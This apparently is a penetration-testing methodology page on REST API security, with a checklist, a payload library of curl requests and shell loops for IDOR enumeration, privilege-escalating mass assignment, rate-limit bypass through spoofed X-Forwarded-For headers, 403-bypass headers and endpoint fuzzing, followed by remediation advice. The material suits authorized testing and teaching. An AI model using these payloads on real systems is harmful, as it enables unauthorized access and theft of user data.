---
title: "REST API Security Testing"
date: 2026-02-24
draft: false
---

# REST API Security Testing

> **Severity**: High–Critical | **CWE**: CWE-284, CWE-285, CWE-200
> **OWASP API Top 10**: API1–API10

---

## What Is REST API Security Testing?

REST APIs expose application logic directly — often with less protection than web UIs. The OWASP API Security Top 10 defines the primary attack vectors: Broken Object Level Authorization (BOLA/IDOR), Broken Authentication, Broken Object Property Level Authorization (Mass Assignment), Rate Limiting bypass, and more.

```
REST API attack surface vs web UI:
- No session cookie → token-based auth → different bypass techniques
- Machine-readable responses → easier automated enumeration
- Versioned endpoints (/v1, /v2) → old versions may lack controls
- Documentation endpoints (/swagger, /openapi.json) → reveals all endpoints
- Often less WAF/filtering than web UI
```

---

## Discovery Checklist

- [ ] Find API documentation: `/swagger-ui`, `/openapi.json`, `/api-docs`, `/redoc`, `/graphql`
- [ ] Enumerate versioned endpoints: `/v1/`, `/v2/`, `/api/v1/`, `/api/v2/`
- [ ] Check for shadow/zombie endpoints (old versions still accessible)
- [ ] Test BOLA on all object IDs (numeric, UUID, base64)
- [ ] Test HTTP method override: GET→DELETE, GET→PUT via `X-HTTP-Method-Override`
- [ ] Test mass assignment in PUT/PATCH bodies (add admin/role fields)
- [ ] Test authentication header bypass: missing, invalid, expired tokens
- [ ] Test rate limiting: login, OTP, search, expensive operations
- [ ] Test JWT-specific attacks (see 28_JWT.md)
- [ ] Check CORS on API: does it reflect Origin with `Access-Control-Allow-Credentials: true`?
- [ ] Test for verbose error messages revealing internals
- [ ] Test file upload endpoints (see 24_FileUpload.md)
- [ ] Check pagination: does negative/zero offset reveal unintended data?

---

## Payload Library

### Attack 1 — BOLA / Broken Object Level Authorization

```bash
# Basic IDOR: change your ID to someone else's
GET /api/v1/users/MY_ID/profile          → 200 OK (your data)
GET /api/v1/users/1/profile              → should be 403, but...
GET /api/v1/users/ADMIN_ID/profile       → cross-account access?

# Systematic enumeration:
for id in $(seq 1 100); do
  status=$(curl -so /dev/null -w "%{http_code}" \
    "https://api.target.com/v1/users/$id/profile" \
    -H "Authorization: Bearer USER_TOKEN")
  echo "User $id: $status"
done

# UUID enumeration — less guessable but still test:
# Find UUIDs in responses, increment/fuzz them
curl https://api.target.com/v1/orders/6ba7b810-9dad-11d1-80b4-00c04fd430c8 \
  -H "Authorization: Bearer ANOTHER_USER_TOKEN"

# Object type substitution:
GET /api/orders/1234          → your order
GET /api/invoices/1234        → same ID, different resource type
GET /api/admin/users/1234     → horizontal → vertical escalation

# Nested resource BOLA:
GET /api/users/VICTIM_ID/addresses           # victim's addresses
GET /api/users/VICTIM_ID/payment-methods     # victim's payment methods
GET /api/users/VICTIM_ID/orders              # victim's order history
```

### Attack 2 — Broken Function Level Authorization (BFLA)

```bash
# Test accessing admin-only endpoints with regular user token:
GET /api/v1/admin/users                   → list all users
POST /api/v1/admin/users/1/promote        → promote to admin
DELETE /api/v1/users/VICTIM_ID            → delete another user
GET /api/v1/reports/financial             → financial data
POST /api/v1/system/config                → system configuration

# HTTP method confusion:
# App only protects POST /resource but not PUT, PATCH, DELETE
GET /api/v1/admin/settings                → 403
POST /api/v1/admin/settings               → 403
PUT /api/v1/admin/settings                → 200? (missing protection)

# Path traversal in API:
GET /api/v1/users/me/../admin/users       → path confusion
GET /api/v1/../admin/settings             → skip auth prefix

# Version bypass:
GET /api/v2/admin/users                   → 403
GET /api/v1/admin/users                   → 200 (old version unprotected)
GET /v1/admin/users                       → different path, same backend
```

### Attack 3 — Mass Assignment

```bash
# Find: what fields does the server accept?
# PUT /api/v1/users/me with extra fields:
curl -X PUT https://api.target.com/v1/users/me \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test User",
    "email": "test@test.com",
    "role": "admin",
    "isAdmin": true,
    "verified": true,
    "credits": 99999,
    "subscription": "enterprise",
    "permissions": ["read", "write", "delete", "admin"]
  }'

# PATCH — partial update often even less protected:
curl -X PATCH https://api.target.com/v1/users/me \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# Nested mass assignment:
curl -X PUT https://api.target.com/v1/products/123 \
  -d '{"price": 0.01, "discount": 100, "internal": {"cost": 0}}'

# Registration mass assignment:
curl -X POST https://api.target.com/v1/register \
  -d '{
    "username": "attacker",
    "password": "pass",
    "isAdmin": true,
    "emailVerified": true,
    "betaAccess": true
  }'
```

### Attack 4 — Rate Limit Bypass

```bash
# Header-based IP rotation (X-Forwarded-For etc.):
for ip in $(seq 1 50 | xargs -I{} echo "192.168.1.{}"); do
  curl -s -X POST https://api.target.com/v1/auth/login \
    -H "X-Forwarded-For: $ip" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@corp.com","password":"test"}' &
done
wait

# Rate limit per endpoint but not per action:
# Endpoint A limits to 10/min, Endpoint B has no limit
# But both write to same counter → abuse endpoint B

# Null byte bypass (some parsers treat as request boundary):
POST /api/login HTTP/1.1
email=admin@corp.com%00&password=test

# Content-Type variation:
# Rate limit checks JSON Content-Type only → bypass with form-encoded:
curl -X POST https://api.target.com/v1/otp/verify \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "otp=123456"  # instead of JSON
```

### Attack 5 — API Key / Token Testing

```bash
# Find API keys in:
# JS files, Git history, mobile app decompiled code, documentation

# Test API key scope escalation:
# My key: read-only → try write operations
curl -X DELETE https://api.target.com/v1/users/1337 \
  -H "X-API-Key: MY_READ_ONLY_KEY"

# API key in URL → leaks in Referer, logs:
curl "https://api.target.com/v1/data?api_key=SECRET_KEY"
# More secure: Authorization: ApiKey SECRET_KEY

# Test: does API accept both header and URL param key?
# → URL param is logged in server access logs → harvest from logs

# Key rotation bypass (old keys still valid?):
curl https://api.target.com/v1/me \
  -H "Authorization: Bearer OLD_TOKEN"

# JWT-based API auth → see 28_JWT.md for full attack tree
```

### Attack 6 — Excessive Data Exposure

```bash
# API returns more data than UI shows:
# UI shows: name, email
# API returns: name, email, phone, dob, ssn, password_hash, internal_id

curl -s https://api.target.com/v1/users/me \
  -H "Authorization: Bearer TOKEN" | python3 -m json.tool

# Nested object exposure:
curl -s https://api.target.com/v1/products/1 | python3 -m json.tool
# → {"name":"Widget","price":9.99,"internal":{"cost":0.50,"supplier_id":42}}

# Admin fields in regular user response:
# Look for: isAdmin, role, permissions, internal_notes, createdBy, updatedAt

# Batch API — get all users' data:
POST /api/graphql {"query": "{ users { nodes { id email passwordHash } } }"}
# Or:
GET /api/v1/users?page=1&per_page=10000    # pagination abuse
```

### Attack 7 — Shadow / Zombie Endpoint Discovery

```bash
# Enumerate API versions:
for v in v1 v2 v3 v4 v0 beta alpha internal; do
  status=$(curl -so /dev/null -w "%{http_code}" \
    "https://api.target.com/$v/users")
  echo "/$v/users: $status"
done

# Check Swagger/OpenAPI docs:
for path in swagger-ui swagger-ui.html api-docs openapi.json \
            swagger.json swagger.yaml redoc v1/swagger.json; do
  curl -si "https://target.com/$path" | head -3
done

# Find API from JS bundles:
grep -rn "api/v\|endpoint\|baseURL\|apiUrl" --include="*.js" . | \
  grep -v "node_modules"

# Wayback Machine for old API endpoints:
waybackurls api.target.com | grep -E "/api/v[0-9]" | sort -u

# ffuf with API wordlist:
ffuf -u https://api.target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,403 -o api_endpoints.json
```

---

## Tools

```bash
# Burp Suite:
# - Proxy: capture all API traffic
# - Repeater: manual BOLA/BFLA testing
# - Scanner: automated IDOR detection
# - Extensions: Autorize (BOLA), AuthMatrix (BFLA), Param Miner

# mitmproxy — API traffic interception:
mitmproxy --mode transparent --ssl-insecure

# Postman / Insomnia — API testing:
# Import Swagger/OpenAPI spec → test all endpoints

# REST-assured (Java) — automated API testing framework

# jwt_tool — JWT analysis (see 28_JWT.md):
python3 jwt_tool.py TOKEN -t

# ffuf — API endpoint fuzzing:
ffuf -u "https://api.target.com/v1/FUZZ" \
  -H "Authorization: Bearer TOKEN" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Autorize (Burp extension):
# Automatic BOLA testing — replays every request with low-priv token
# and compares responses

# 403 bypass techniques:
for h in "X-Original-URL" "X-Rewrite-URL" "X-Custom-IP-Authorization" \
         "X-Forwarded-For" "X-Forward-For" "X-Remote-IP"; do
  curl -s -H "$h: 127.0.0.1" "https://api.target.com/admin/users" | head -5
done

# HTTP method fuzzing:
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  status=$(curl -so /dev/null -w "%{http_code}" \
    -X "$method" "https://api.target.com/v1/users/1337" \
    -H "Authorization: Bearer LOW_PRIV_TOKEN")
  echo "$method: $status"
done
```

---

## Remediation Reference

- **BOLA**: validate object ownership on every request — not just authentication
- **BFLA**: enforce function-level authorization server-side — client-side hiding is not protection
- **Mass Assignment**: use allowlists for accepted fields — never auto-bind all request body fields
- **Rate Limiting**: apply per user, per IP, and per endpoint — use token bucket or sliding window algorithms
- **Excessive Data Exposure**: return only the fields needed — use response DTOs, never serialise full DB models
- **Shadow APIs**: inventory and decommission old API versions; redirect with 301 or return 410 Gone
- **API Documentation**: restrict Swagger/OpenAPI access to internal network or require authentication
- **Versioning strategy**: when deprecating, enforce authorization controls on old versions equally

*Part of the Web Application Penetration Testing Methodology series.*
